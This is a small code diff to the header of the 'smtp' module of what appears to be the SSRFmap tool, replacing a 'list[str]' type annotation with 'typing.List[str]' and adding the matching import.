@@ -1,12 +1,13 @@
 import logging
 import urllib.parse as urllib
+from typing import List
 
 from ssrfmap.core.utils import gen_ip_list, wrapper_gopher
 
 name = "smtp"
 description = "Send a mail via SMTP"
 author = "Swissky"
-documentation: list[str] = []
+documentation: List[str] = []
 
 
 class exploit:
